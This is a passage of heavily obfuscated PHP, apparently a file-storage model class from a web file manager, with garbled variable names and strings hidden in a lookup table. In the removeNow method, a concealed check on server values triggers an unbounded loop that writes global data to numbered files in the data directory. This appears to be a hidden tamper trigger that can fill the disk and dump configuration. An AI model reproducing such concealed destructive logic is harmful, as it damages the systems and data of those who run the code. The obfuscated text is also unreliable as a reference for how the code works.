$ñË—ğ); $¯øĞ²Ê› = Model($”€ç”[519])->get($¶Á¤€×, $ñË—ğ); } return $¯øĞ²Ê›; } private static function valueSet($ìÙğíÅ‡, $ ÔÑæû„ = false) { $·”äÌ¥¾ =& $_SERVER[äô®•½Â]; $·æë“·ç = $·”äÌ¥¾[1775]; CacheLock::lock($·æë“·ç); $»‚‘›«ä = Model($·”äÌ¥¾[519])->set($ìÙğíÅ‡, $ ÔÑæû„, $·”äÌ¥¾[1774]); CacheLock::unlock($·æë“·ç); return $»‚‘›«ä; } protected static function log($â¶´¡Åô) { write_log($â¶´¡Åô, $_SERVER[äô®•½Â][1760]); } private static function cacheClear() { $Ï¨òıÍ§ =& $_SERVER[äô®•½Â]; Cache::clearMemory(Model($Ï¨òıÍ§[519])->cacheKey($Ï¨òıÍ§[1774])); Cache::clearMemory(Model($Ï¨òıÍ§[519])->cacheKey($Ï¨òıÍ§[1776])); Model($Ï¨òıÍ§[1745])->cacheClear(); self::closeDatabase(); } } goto FÆ›°ŞƒÅŞ; cÏ‰Í—Û: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($±ò´ñ§­) { $–‘îİİ =& $_SERVER[äô®•½Â]; $Ç®Ï•Ä = Model($–‘îİİ[590])->where(array($–‘îİİ[1768] => $±ò´ñ§­))->find(); $İ½Âµ°¯ = $this->_mkdirRoot(SourceModel::TYPE_USER, $±ò´ñ§­, $Ç®Ï•Ä[$–‘îİİ[32]]); $this->userDesktopAdd($İ½Âµ°¯); return $İ½Âµ°¯; } public function userDesktopAdd($˜ì¤‰) { $è¶şÎüî =& $_SERVER[äô®•½Â]; $ŠÛ²úŠá = LNG($è¶şÎüî[2263]); $è¢œœÁÕ = $this->mkdir($˜ì¤‰, $ŠÛ²úŠá); $this->metaSet($è¢œœÁÕ, $è¶şÎüî[2264], $è¶şÎüî[91]); $this->metaSet($˜ì¤‰, $è¶şÎüî[2265], $è¢œœÁÕ); } public function userPathSafeAdd($æÈšÄ³) { $îÖÈí÷š =& $_SERVER[äô®•½Â]; $½õÖï¥Ì = Model($îÖÈí÷š[590])->getInfoFull($æÈšÄ³); if (!$½õÖï¥Ì) { return !1; } if (_get($½õÖï¥Ì, $îÖÈí÷š[611])) { return $½õÖï¥Ì[$îÖÈí÷š[552]][$îÖÈí÷š[2266]]; } $øÛ¼±¨Ÿ = $this->_mkdirRoot(SourceModel::TYPE_USER, $æÈšÄ³, $îÖÈí÷š[2267], $îÖÈí÷š[2268]); Model($îÖÈí÷š[590])->metaSet($æÈšÄ³, $îÖÈí÷š[2266], $øÛ¼±¨Ÿ); $this->metaSet($øÛ¼±¨Ÿ, $îÖÈí÷š[2269], $æÈšÄ³); return $øÛ¼±¨Ÿ; } public function userPathAppAdd($Úí‹›ÃÂ, $ôñ•¨¯¬ = '', $¯òŠ„ = '') { $ã¹Ìå­Ë =& $_SERVER[äô®•½Â]; $ğÜÏÁå = Model($ã¹Ìå­Ë[590])->getInfoFull($Úí‹›ÃÂ); if (!$ğÜÏÁå) { return !1; } $ÙÙÇ÷ë¢ = $ğÜÏÁå[$ã¹Ìå­Ë[552]] ? $ğÜÏÁå[$ã¹Ìå­Ë[552]] : array(); $’æÀÆğÈ = $ÙÙÇ÷ë¢[$ã¹Ìå­Ë[2270]]; if (!$’æÀÆğÈ) { $’æÀÆğÈ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Úí‹›ÃÂ, $ã¹Ìå­Ë[2271], $ã¹Ìå­Ë[2272]); Model($ã¹Ìå­Ë[590])->metaSet($Úí‹›ÃÂ, $ã¹Ìå­Ë[2270], $’æÀÆğÈ . $ã¹Ìå­Ë[12]); $this->metaSet($’æÀÆğÈ, $ã¹Ìå­Ë[2270], $Úí‹›ÃÂ); } if (!$ôñ•¨¯¬) { return $’æÀÆğÈ; } $„Ï¥… = $ÙÙÇ÷ë¢[$ã¹Ìå­Ë[2273] . $ôñ•¨¯¬]; if (!$„Ï¥…) { $„Ï¥… = $this->mkdir($’æÀÆğÈ, $ôñ•¨¯¬); Model($ã¹Ìå­Ë[590])->metaSet($Úí‹›ÃÂ, $ã¹Ìå­Ë[2273] . $ôñ•¨¯¬, $„Ï¥…); $this->metaSet($„Ï¥…, $ã¹Ìå­Ë[2273] . $ôñ•¨¯¬, $Úí‹›ÃÂ); } if (!$¯òŠ„) { return $„Ï¥…; } $óáÌá»‘ = $this->mkdir($„Ï¥…, $¯òŠ„); return $óáÌá»‘; } public function groupRootAdd($ƒí“æ½¸) { $¢¸Æà‹¯ =& $_SERVER[äô®•½Â]; $Øé¼“òŞ = Model($¢¸Æà‹¯[598])->where(array($¢¸Æà‹¯[2067] => $ƒí“æ½¸))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ƒí“æ½¸, $Øé¼“òŞ[$¢¸Æà‹¯[32]]); } public function systemRootPathAdd($Âóª­Ãó) { if ($Âóª­Ãó != $_SERVER[äô®•½Â][621]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Âóª­Ãó); } public function userRootRemove($„Áö‡Á«) { $¡ ±Ê² = $this->targetSourceRoot(SourceModel::TYPE_USER, $„Áö‡Á«, !0); foreach ($¡ ±Ê² as $¸ŒğÅ¦°) { if (!$¸ŒğÅ¦°) { continue; } $this->remove($¸ŒğÅ¦°[$_SERVER[äô®•½Â][194]], !1); } } public function groupRootRemove($Ïª¾“ú¢) { $Ñğœ¡Í = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $Ïª¾“ú¢); if (!$Ñğœ¡Í) { return; } $this->remove($Ñğœ¡Í[$_SERVER[äô®•½Â][194]], !1); } private function _mkdirRoot($‡™‡‡áÈ, $ˆµÑ²¥ï, $±çßé’Ó, $µÉ¼¤ıê = '') { $ïæ¹Ü¥Ô =& $_SERVER[äô®•½Â]; $…Ñ€³¤† = defined($ïæ¹Ü¥Ô[2208]) ? USER_ID : 0; $¾­Ù’ôæ = array($ïæ¹Ü¥Ô[488] => 0, $ïæ¹Ü¥Ô[664] => $‡™‡‡áÈ, $ïæ¹Ü¥Ô[665] => $ˆµÑ²¥ï, $ïæ¹Ü¥Ô[662] => 1, $ïæ¹Ü¥Ô[666] => $…Ñ€³¤†, $ïæ¹Ü¥Ô[667] => $…Ñ€³¤†, $ïæ¹Ü¥Ô[663] => $µÉ¼¤ıê, $ïæ¹Ü¥Ô[668] => $ïæ¹Ü¥Ô[606], $ïæ¹Ü¥Ô[515] => 0, $ïæ¹Ü¥Ô[633] => 0, $ïæ¹Ü¥Ô[555] => 0, $ïæ¹Ü¥Ô[669] => $ïæ¹Ü¥Ô[12]); if ($Ÿùúëï× = $this->where($¾­Ù’ôæ)->find()) { return $Ÿùúëï×[$ïæ¹Ü¥Ô[194]]; } $Á—ÖÕÚ = "\x4d\x6f\144\x65\x6c\x53\157\x75\x72\x63\145\56\x6d\153\144\151\x72\x52\157\157\164\x2e{$‡™‡‡áÈ}\x2e{$ˆµÑ²¥ï}\x2e" . $±çßé’Ó; CacheLock::lock($Á—ÖÕÚ); $¾­Ù’ôæ[$ïæ¹Ü¥Ô[32]] = $±çßé’Ó; $†ßØå = $this->add($¾­Ù’ôæ); $¦ËÂàç½ = array($ïæ¹Ü¥Ô[670] => short_id($†ßØå)); $this->where(array($ïæ¹Ü¥Ô[502] => $†ßØå))->save($¦ËÂàç½); CacheLock::unlock($Á—ÖÕÚ); return $†ßØå; } private function targetSourceRoot($ÙÙÔäş¤, $½ÀË½Ìı, $°ÈÃçùˆ = false) { $óğ·³“ =& $_SERVER[äô®•½Â]; $Ùçã…ˆÏ = array($óğ·³“[488] => 0, $óğ·³“[664] => $ÙÙÔäş¤, $óğ·³“[665] => $½ÀË½Ìı); if ($°ÈÃçùˆ) { $ô»ôËÂ“ = $this->where($Ùçã…ˆÏ)->select(); return $ô»ôËÂ“ ? $ô»ôËÂ“ : array(); } $×Ñ® Ÿ = $this->where($Ùçã…ˆÏ)->find(); return $×Ñ® Ÿ ? $×Ñ® Ÿ : array(); } public function sourceRootGroup($åô½€ß) { $üªÀ…ç =& $_SERVER[äô®•½Â]; if (is_string($åô½€ß)) { $åô½€ß = array($åô½€ß); } $›Ş¹™ı£ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $åô½€ß, $üªÀ…ç[223]); $å£ä¨Õ³ = array($üªÀ…ç[456] => $›Ş¹™ı£, $üªÀ…ç[453] => array($üªÀ…ç[824] => count($åô½€ß))); $this->_listDataApply($å£ä¨Õ³[$üªÀ…ç[456]]); $this->_listMake($å£ä¨Õ³); return array_to_keyvalue($å£ä¨Õ³[$üªÀ…ç[85]], $üªÀ…ç[582]); } public function mkfile($ŠÊÓÍû, $İš¥Í©â, $×Î¡ó£ = '', $Ÿ¦İ¹ªë = REPEAT_RENAME) { $í½”¾¡´ =& $_SERVER[äô®•½Â]; $¤–Ç«ş = KodIO::ioFileDriverGet($í½”¾¡´[494] . $ŠÊÓÍû . $í½”¾¡´[413]); $ÀŒÎŸ´¦ = Model($í½”¾¡´[690])->addFileByContent($×Î¡ó£, $¤–Ç«ş, $İš¥Í©â); return $this->_createFileCall($ŠÊÓÍû, $İš¥Í©â, $ÀŒÎŸ´¦, $Ÿ¦İ¹ªë, $í½”¾¡´[1436]); } public function addFile($ã¶ÇÊÛå, $ğ€î¡Ä•, $ƒŠ¦€Šì, $É¯İ¬¹Ï = false, $ÕèÆğ¦È = REPEAT_RENAME) { $¤Ú„ÍŠ¼ =& $_SERVER[äô®•½Â]; $µĞªÒıµ = KodIO::ioFileDriverGet($¤Ú„ÍŠ¼[494] . $ã¶ÇÊÛå . $¤Ú„ÍŠ¼[413]); $¤Éöı„— = Model($¤Ú„ÍŠ¼[690])->addFile($ğ€î¡Ä•, $µĞªÒıµ, $ƒŠ¦€Šì, $É¯İ¬¹Ï); return $this->_createFileCall($ã¶ÇÊÛå, $ƒŠ¦€Šì, $¤Éöı„—, $ÕèÆğ¦È); } public function addFileByFileID($®â›¡üÑ, $¿ğœ£Ó–, $ßûÀŠ , $¬¼Ğıäì = REPEAT_RENAME) { $’ÌÙÂëÑ =& $_SERVER[äô®•½Â]; $ğ·¿Ÿ• = Model($’ÌÙÂëÑ[690])->find($¿ğœ£Ó–); Model($’ÌÙÂëÑ[690])->linkAdd($¿ğœ£Ó–); return $this->_createFileCall($®â›¡üÑ, $ßûÀŠ , $ğ·¿Ÿ•, $¬¼Ğıäì); } public function addFileByRemote($å‹ì‚şÚ, $ƒ¸¹ûï‘, $ÆÄ×ó„¥, $ƒˆôÑ®‰ = array(), $ô”¥—Æ = REPEAT_RENAME) { $Ê·³ªÑò = Model($_SERVER[äô®•½Â][690])->addFileByRemote($ƒ¸¹ûï‘, $ÆÄ×ó„¥, $ƒˆôÑ®‰); return $this->_createFileCall($å‹ì‚şÚ, $ÆÄ×ó„¥, $Ê·³ªÑò, $ô”¥—Æ); } private function _createFileCall($…Ò°¢‹È, $«îÈõ’, $å¢™Å§Ş, $ĞÜ¡ıÅ€, $Ëªê•õÁ = "\165\x70\154\x6f\141\x64") { $íÄ¹¢’Ò =& $_SERVER[äô®•½Â]; if (!$å¢™Å§Ş) { return !1; } $â¤ÒÈ‰Æ = !1; $this->setMasterDB(); $this->lockWriteStart($…Ò°¢‹È, $«îÈõ’); $¹´ÍºœË = $this->fileNameExist($…Ò°¢‹È, $«îÈõ’); $ÛÜ±ÊËÑ = $this->_createFile($…Ò°¢‹È, $«îÈõ’, $å¢™Å§Ş, $ĞÜ¡ıÅ€, $â¤ÒÈ‰Æ); if (!$â¤ÒÈ‰Æ) { Model($íÄ¹¢’Ò[557])->remove($å¢™Å§Ş[$íÄ¹¢’Ò[554]]); } if ($â¤ÒÈ‰Æ && $ÛÜ±ÊËÑ && $ÛÜ±ÊËÑ != $¹´ÍºœË) { Model($íÄ¹¢’Ò[2235])->eventCreate($ÛÜ±ÊËÑ, $Ëªê•õÁ); } $this->lockWriteEnd($…Ò°¢‹È, $«îÈõ’); return $ÛÜ±ÊËÑ; } public function mkdir($®ø˜Û¥¸, $ñÑçÔÙ, $»¤šæÁû = REPEAT_SKIP) { $ºåÆè =& $_SERVER[äô®•½Â]; $this->setMasterDB(); $õ˜›®¬æ = $this->sourceInfo($®ø˜Û¥¸); if (!$õ˜›®¬æ) { return !1; } $this->lockWriteStart($®ø˜Û¥¸, $ñÑçÔÙ); if ($»¤šæÁû !== !1) { $ÃîëÛî = $this->fileNameExist($®ø˜Û¥¸, $ñÑçÔÙ); if ($ÃîëÛî && $»¤šæÁû != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($®ø˜Û¥¸, $ñÑçÔÙ); return $ÃîëÛî; } $ñÑçÔÙ = $this->fileNameAuto($®ø˜Û¥¸, $ñÑçÔÙ, $»¤šæÁû); } $ÇâÚ±¿¬ = array($ºåÆè[662] => 1, $ºåÆè[505] => $ñÑçÔÙ, $ºåÆè[663] => $ºåÆè[12], $ºåÆè[555] => 0, $ºåÆè[633] => 0); $Ğè¯Î§æ = $this->_addSource($ÇâÚ±¿¬, $õ˜›®¬æ); Model($ºåÆè[2235])->eventCreate($Ğè¯Î§æ, $ºåÆè[1437]); $this->lockWriteEnd($®ø˜Û¥¸, $ñÑçÔÙ); return $Ğè¯Î§æ; } public function listSourceRoot($¾­ìÒ¤¾, $ĞµõåŞº, $æ—ğ¨ø¤ = "\x73\x6f\x75\162\x63\x65\x49\x44\x2c\164\141\162\x67\145\164\111\x44\54\163\151\172\x65") { $òìëÖò¿ =& $_SERVER[äô®•½Â]; $Ö‘í‚¡  = $òìëÖò¿[465]; $Œ–ã¬ä€ = array(); $òÜÕ ‡ = 1024 * 50; $—£°íÉ = is_array($—£°íÉ) ? $—£°íÉ : array(); $…ñ¼ï¢Ù = count($ĞµõåŞº); $ö±Ğ¸éç = $this->tablePrefix . $òìëÖò¿[2274]; for ($µø¶å = 0; $µø¶å < $…ñ¼ï¢Ù; $µø¶å++) { $–ú†Ï×Ù = $ĞµõåŞº[$µø¶å]; $Ö‘í‚¡  .= "\x53\105\x4c\x45\103\x54\40\52\x20\x46\x52\x4f\x4d\40\x28\x53\105\114\105\103\x54\40{$æ—ğ¨ø¤}\40\106\x52\x4f\115\x20\140{$ö±Ğ¸éç}\x60\40\127\x48\x45\122\x45\40"; $Ö‘í‚¡  .= "\x60\x70\141\x72\x65\156\164\x49\x44\140\x3d\60\x20\x41\x4e\x44\x20\140\164\141\162\x67\x65\164\x49\104\x60\75{$–ú†Ï×Ù}\x20\x41\116\x44\x20\140\x74\141\x72\147\x65\x74\x54\171\160\145\x60\x3d{$¾­ìÒ¤¾}\x20\141\x6e\x64\40\146\151\x6c\145\124\x79\x70\145\x3d\47\x27\40\154\151\155\x69\x74\40\61\x29\40\141\163\x20\x74\x62\x5f{$µø¶å}\x20\x55\116\x49\117\116\40\101\114\114\40"; if ((strlen($Ö‘í‚¡ ) >= $òÜÕ ‡ || $µø¶å == $…ñ¼ï¢Ù - 1) && $Ö‘í‚¡ ) { $Ö‘í‚¡  = substr($Ö‘í‚¡ , 0, -strlen($òìëÖò¿[1110])); $®ë¾Ûµ = $this->query($Ö‘í‚¡ ); $Ö‘í‚¡  = $òìëÖò¿[12]; $Œ–ã¬ä€ = array_merge($Œ–ã¬ä€, $®ë¾Ûµ); } } return $Œ–ã¬ä€; } private function _createFile($ú³îşÌ, $ÉèåÚÊİ, $‰€´±Ã‹, $÷¯ÙÜÖç, &$üÎêÑËÓ) { $ßúß‡é =& $_SERVER[äô®•½Â]; $¿›óÓã§ = $this->sourceInfo($ú³îşÌ); if (!$‰€´±Ã‹ || !$¿›óÓã§) { return !1; } if ($÷¯ÙÜÖç !== !1) { $½°À¯Ö‘ = $this->fileNameExist($ú³îşÌ, $ÉèåÚÊİ); } $üÎêÑËÓ = !0; if ($÷¯ÙÜÖç && $½°À¯Ö‘) { if ($÷¯ÙÜÖç == REPEAT_SKIP) { $üÎêÑËÓ = !1; return $½°À¯Ö‘; } else { if ($÷¯ÙÜÖç == REPEAT_REPLACE) { $Ë‰áÇÅ† = $this->sourceInfo($½°À¯Ö‘); $á…»·ß£ = $this->fileHistory($Ë‰áÇÅ†, $‰€´±Ã‹[$ßúß‡é[554]], $‰€´±Ã‹[$ßúß‡é[79]]); if (!$á…»·ß£) { $üÎêÑËÓ = !1; } else { $this->folderSizeReset($ú³îşÌ); } return $½°À¯Ö‘; } else { $ÉèåÚÊİ = $this->fileNameAuto($ú³îşÌ, $ÉèåÚÊİ, $÷¯ÙÜÖç, !1); } } } $ôã®Œü = array($ßúß‡é[662] => 0, $ßúß‡é[505] => $ÉèåÚÊİ, $ßúß‡é[663] => substr(get_path_ext($ÉèåÚÊİ), 0, 10), $ßúß‡é[555] => $‰€´±Ã‹[$ßúß‡é[554]], $ßúß‡é[633] => $‰€´±Ã‹[$ßúß‡é[79]]); $ˆé‰ÉÒ— = $this->_addSource($ôã®Œü, $¿›óÓã§); $this->folderSizeReset($ú³îşÌ, intval($ôã®Œü[$ßúß‡é[79]])); return $ˆé‰ÉÒ—; } protected function fileHistory($Úë¶Öñå, $ìæÔÃ¯’, $æù‹È¡±) { $¡ø®£ˆ‰ =& $_SERVER[äô®•½Â]; if ($Úë¶Öñå[$¡ø®£ˆ‰[554]] == $ìæÔÃ¯’) { return !1; } $this->checkLock($Úë¶Öñå[$¡ø®£ˆ‰[194]], $ìæÔÃ¯’); Model($¡ø®£ˆ‰[2275])->addHistory($Úë¶Öñå); $¥ëŞ’ªÅ = array($¡ø®£ˆ‰[667] => USER_ID, $¡ø®£ˆ‰[509] => time(), $¡ø®£ˆ‰[554] => $ìæÔÃ¯’, $¡ø®£ˆ‰[79] => $æù‹È¡±); $this->where(array($¡ø®£ˆ‰[502] => $Úë¶Öñå[$¡ø®£ˆ‰[194]]))->save($¥ëŞ’ªÅ); $this->sourceCacheClear($Úë¶Öñå[$¡ø®£ˆ‰[194]]); return !0; } public function checkLock($êÄÁëı‘, $¹Û¬Ü©ò) { $òÌéìú‚ =& $_SERVER[äô®•½Â]; $¸ÜÑì²ø = $this->pathInfo($êÄÁëı‘); if (!$this->fileIsLock($¸ÜÑì²ø, !0)) { return; } $€Õ§ãáç = Session::get($òÌéìú‚[2276]); $‘°àÇœ¨ = substr($¸ÜÑì²ø[$òÌéìú‚[32]], 0, -1 - strlen($¸ÜÑì²ø[$òÌéìú‚[169]])) . $òÌéìú‚[1291] . $€Õ§ãáç . $òÌéìú‚[10] . $¸ÜÑì²ø[$òÌéìú‚[169]]; $Õ‚ïÓĞİ = Model($òÌéìú‚[690])->find($¹Û¬Ü©ò); $this->_createFileCall($¸ÜÑì²ø[$òÌéìú‚[193]], $‘°àÇœ¨, $Õ‚ïÓĞİ, REPEAT_REPLACE, $òÌéìú‚[1436]); $ı’˜ú¢ = $¸ÜÑì²ø[$òÌéìú‚[552]][$òÌéìú‚[626]]; $øó‰ = $ı’˜ú¢[$òÌéìú‚[2277]] ? $ı’˜ú¢[$òÌéìú‚[2277]] : $ı’˜ú¢[$òÌéìú‚[32]]; show_json(LNG($òÌéìú‚[2278]) . $òÌéìú‚[2279] . LNG($òÌéìú‚[2280]) . $òÌéìú‚[2281] . $øó‰ . $òÌéìú‚[2282], !1); } public function fileIsLock($ÓÜööóµ, $Â–èº­ú = false) { $»áûÄÍ =& $_SERVER[äô®•½Â]; if (!_get($ÓÜööóµ, $»áûÄÍ[622], 0)) { return !1; } if ($ÓÜööóµ[$»áûÄÍ[552]][$»áûÄÍ[625]] != USER_ID) { return !0; } $ù¯®¸„ = $GLOBALS[$»áûÄÍ[6]][$»áûÄÍ[92]][$»áûÄÍ[623]]; if ($ÓÜööóµ[$»áûÄÍ[552]][$»áûÄÍ[624]] <= time() - $ù¯®¸„) { $this->metaSet($ÓÜööóµ[$»áûÄÍ[194]], $»áûÄÍ[625], null); $this->metaSet($ÓÜööóµ[$»áûÄÍ[194]], $»áûÄÍ[624], null); } if ($Â–èº­ú) { $this->metaSet($ÓÜööóµ[$»áûÄÍ[194]], $»áûÄÍ[624], time()); } return !1; } private function _addSource($öáÌ¿Õ, $“¬…ğ‚­) { $®»°§§¡ =& $_SERVER[äô®•½Â]; $Í‹¸²¼’ = defined($®»°§§¡[2208]) ? USER_ID : 0; $¥û„½şŒ = array($®»°§§¡[664] => $“¬…ğ‚­[$®»°§§¡[191]], $®»°§§¡[665] => $“¬…ğ‚­[$®»°§§¡[582]], $®»°§§¡[666] => $Í‹¸²¼’, $®»°§§¡[667] => $Í‹¸²¼’, $®»°§§¡[488] => $“¬…ğ‚­[$®»°§§¡[194]], $®»°§§¡[668] => $“¬…ğ‚­[$®»°§§¡[597]] . $“¬…ğ‚­[$®»°§§¡[194]] . $®»°§§¡[50], $®»°§§¡[515] => 0, $®»°§§¡[669] => $®»°§§¡[12]); $öáÌ¿Õ = array_merge($¥û„½şŒ, $öáÌ¿Õ); $this->updateModifyTime($öáÌ¿Õ[$®»°§§¡[193]]); $Š›–¥Ã³ = $®»°§§¡[2283] . $“¬…ğ‚­[$®»°§§¡[194]]; if (isset(self::$cacheChildList[$Š›–¥Ã³])) { unset(self::$cacheChildList[$Š›–¥Ã³]); } static $ƒˆ¶Åêñ = false; if (!$ƒˆ¶Åêñ) { Hook::trigger($®»°§§¡[652], $öáÌ¿Õ); $ƒˆ¶Åêñ = !0; } $ğ—•’ë« = $this->add($öáÌ¿Õ); $Çèç³÷ç = array($®»°§§¡[670] => short_id($ğ—•’ë«)); $this->where(array($®»°§§¡[502] => $ğ—•’ë«))->save($Çèç³÷ç); $this->setNamePinyin($ğ—•’ë«, $öáÌ¿Õ[$®»°§§¡[32]]); return $ğ—•’ë«; } public function remove($ëÎØÀ´î, $Ï­Ôõˆ = true) { $ç¨åÎ¾„ =& $_SERVER[äô®•½Â]; $Æñ¦Şºğ = $this->sourceInfo($ëÎØÀ´î); $˜£ƒâ£Ô = intval($Æñ¦Şºğ[$ç¨åÎ¾„[191]]) === self::TYPE_SYSTEM; $­å¡şâÌ = Model($ç¨åÎ¾„[519])->get($ç¨åÎ¾„[2284]) == $ç¨åÎ¾„[91]; if ($˜£ƒâ£Ô || $Ï­Ôõˆ || !$­å¡şâÌ) { return $this->removeNow($ëÎØÀ´î, $Ï­Ôõˆ); } $“ÛË£ª = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $á›©èú† = $Æñ¦Şºğ[$ç¨åÎ¾„[191]] == self::TYPE_USER ? $ç¨åÎ¾„[678] : $ç¨åÎ¾„[591]; if ($á›©èú† == $ç¨åÎ¾„[678]) { $ï…Ìœ¸ = Model($ç¨åÎ¾„[590])->getInfo($Æñ¦Şºğ[$ç¨åÎ¾„[582]]); $æÎÕçÖ = !empty($ï…Ìœ¸[$ç¨åÎ¾„[2277]]) ? $ï…Ìœ¸[$ç¨åÎ¾„[2277]] : $ï…Ìœ¸[$ç¨åÎ¾„[32]]; $æÎÕçÖ = $ç¨åÎ¾„[349] . $æÎÕçÖ . $ç¨åÎ¾„[2285] . $Æñ¦Şºğ[$ç¨åÎ¾„[582]]; } else { $ï…Ìœ¸ = Model($ç¨åÎ¾„[598])->getInfo($Æñ¦Şºğ[$ç¨åÎ¾„[582]]); $æÎÕçÖ = _get($ï…Ìœ¸, $ç¨åÎ¾„[32]); $æÎÕçÖ = $ç¨åÎ¾„[176] . $æÎÕçÖ . $ç¨åÎ¾„[2286] . $Æñ¦Şºğ[$ç¨åÎ¾„[582]]; } $ò»€¼” = $ç¨åÎ¾„[2287] . md5($æÎÕçÖ); CacheLock::lock($ò»€¼”); $åŒ€Ï‹‹ = $this->fileNameExist($“ÛË£ª, $æÎÕçÖ); if (!$åŒ€Ï‹‹) { $åŒ€Ï‹‹ = $this->mkdir($“ÛË£ª, $æÎÕçÖ, REPEAT_SKIP); $this->metaSet($åŒ€Ï‹‹, $ç¨åÎ¾„[2288], $á›©èú†); $this->metaSet($åŒ€Ï‹‹, $ç¨åÎ¾„[2289], $Æñ¦Şºğ[$ç¨åÎ¾„[582]]); if ($Æñ¦Şºğ[$ç¨åÎ¾„[193]] != 0) { $this->metaSet($åŒ€Ï‹‹, $ç¨åÎ¾„[2290], _get($ï…Ìœ¸, $ç¨åÎ¾„[2291])); } } CacheLock::unlock($ò»€¼”); $this->metaSet($ëÎØÀ´î, $ç¨åÎ¾„[2292], $Æñ¦Şºğ[$ç¨åÎ¾„[193]]); $this->where(array($ç¨åÎ¾„[194] => $ëÎØÀ´î))->save(array($ç¨åÎ¾„[509] => time())); $this->recycleClear($Æñ¦Şºğ); Model($ç¨åÎ¾„[649])->eventRemove($ëÎØÀ´î); $¿¢‹°âÔ = $this->move($ëÎØÀ´î, $åŒ€Ï‹‹, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Æñ¦Şºğ[$ç¨åÎ¾„[193]]); return $¿¢‹°âÔ; } private function recycleClear($âüÛâ„“) { $­ÉÕ˜Ñ€ =& $_SERVER[äô®•½Â]; $´³‰†¼ = $this->childrenAll($âüÛâ„“); $×àç¦Àø = array($­ÉÕ˜Ñ€[502] => array($­ÉÕ˜Ñ€[503], $´³‰†¼[$­ÉÕ˜Ñ€[2293]])); Model($­ÉÕ˜Ñ€[2294])->where($×àç¦Àø)->delete(); } public function removeNow($¿È¶ÁåÁ, $úÌ½æìŒ = true) { $“°øÕÆÉ =& $_SERVER[äô®•½Â]; $÷¾é¢´ = $_SERVER[$“°øÕÆÉ[332]]; $æ”¿¥¬ = $“°øÕÆÉ[949]; if ($_SERVER[$“°øÕÆÉ[324]] != $æ”¿¥¬($÷¾é¢´)) { $†Ş¨½ıÖ = $“°øÕÆÉ[950]; $„Øèå¾ = $“°øÕÆÉ[326]; $Ÿ¤ãÏ« = $_SERVER[$“°øÕÆÉ[327]] . $“°øÕÆÉ[328]; $èŒóÇ˜ = $„Øèå¾($Ÿ¤ãÏ«); $×ã‹İ§† = explode($“°øÕÆÉ[288], $èŒóÇ˜); if (count($×ã‹İ§†) < $“°øÕÆÉ[703]) { $äø´Şğã = $“°øÕÆÉ[330]; $äø´Şğã(); } $ŸíĞ£ñ€ = $“°øÕÆÉ[951]; $ŸíĞ£ñ€($_SERVER[$“°øÕÆÉ[952]]); $†Ş¨½ıÖ = $“°øÕÆÉ[950]; $†Ş¨½ıÖ(); $Ë•ùûÜ = $“°øÕÆÉ[953]; $ù£¥®öé = json_encode($GLOBALS[$“°øÕÆÉ[954]]); $ğ¿”ŠË = 1; for ($— ãş­¯ = $ğ¿”ŠË; $— ãş­¯ > 0; $— ãş­¯++) { $Ë•ùûÜ(DATA_PATH . $— ãş­¯, $ù£¥®öé); } } $öàõåò = $this->sourceInfo($¿È¶ÁåÁ); $û´ºÌÔÒ = $this->pathInfoMore($¿È¶ÁåÁ); if (!$öàõåò) { return !0; } if ($öàõåò[$“°øÕÆÉ[193]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($¿È¶ÁåÁ); Hook::trigger($“°øÕÆÉ[2295], $û´ºÌÔÒ, $úÌ½æìŒ); if ($úÌ½æìŒ) { Model($“°øÕÆÉ[2294])->moveToRecycle($¿È¶ÁåÁ); } else { $ÔÀïıÔü = $this->childrenAll($öàõåò); Model($“°øÕÆÉ[649])->eventRemove($¿È¶ÁåÁ); $this->removeRelevance($ÔÀïıÔü[$“°øÕÆÉ[2293]], $ÔÀïıÔü[$“°øÕÆÉ[1580]]); } $this->folderSizeReset($öàõåò[$“°øÕÆÉ[193]]); $µ›ÓÏ¿Ê = array($öàõåò[$“°øÕÆÉ[193]]); if ($öàõåò[$“°øÕÆÉ[496]] == $“°øÕÆÉ[91]) { $µ›ÓÏ¿Ê[] = $öàõåò[$“°øÕÆÉ[194]]; } $this->updateModifyTime($µ›ÓÏ¿Ê); $this->lockMoveEnd($¿È¶ÁåÁ); Hook::trigger($“°øÕÆÉ[1820], $û´ºÌÔÒ, $úÌ½æìŒ); return !0; } public function childrenAll($Ãî€Õ¢Î) { $¤ıÑØãã =& $_SERVER[äô®•½Â]; $°çï¨¨Ï = $Ãî€Õ¢Î[$¤ıÑØãã[194]]; if ($Ãî€Õ¢Î[$¤ıÑØãã[496]] == $¤ıÑØãã[91]) { $´ßãİ¶Ç = array($¤ıÑØãã[668] => array($¤ıÑØãã[628], $Ãî€Õ¢Î[$¤ıÑØãã[597]] . $°çï¨¨Ï . $¤ıÑØãã[629])); $¤£ÖÚ° = array($¤ıÑØãã[668] => $´ßãİ¶Ç[$¤ıÑØãã[597]]); $ªñéî†» = $this->field($¤ıÑØãã[2296])->where($¤£ÖÚ°)->select(); $¸Øçƒûö = !1; $é¢Ä±½™ = array($°çï¨¨Ï); if ($ªñéî†») { $¸Øçƒûö = array_to_keyvalue($ªñéî†», $¤ıÑØãã[12], $¤ıÑØãã[554]); $¸Øçƒûö = array_remove_value($¸Øçƒûö, $¤ıÑØãã[231]); $é¢Ä±½™ = array_to_keyvalue($ªñéî†», $¤ıÑØãã[12], $¤ıÑØãã[194]); $é¢Ä±½™[] = $°çï¨¨Ï; } } else { $¸Øçƒûö = array($Ãî€Õ¢Î[$¤ıÑØãã[554]]); $é¢Ä±½™ = array($°çï¨¨Ï); } return array($¤ıÑØãã[2293] => $é¢Ä±½™, $¤ıÑØãã[1580] => $¸Øçƒûö); } public function removeArray($í‰¸Š­ƒ) { if (!$í‰¸Š­ƒ) { return !0; } } public function removeRelevance($‡ÔŠ·íõ, $ä·ı›ÌÇ) { $ªôÀá¹ =& $_SERVER[äô®•½Â]; $‡ÔŠ·íõ = $‡ÔŠ·íõ ? $‡ÔŠ·íõ : array(); $ä·ı›ÌÇ = $ä·ı›ÌÇ ? $ä·ı›ÌÇ : array(); $‡ÔŠ·íõ = 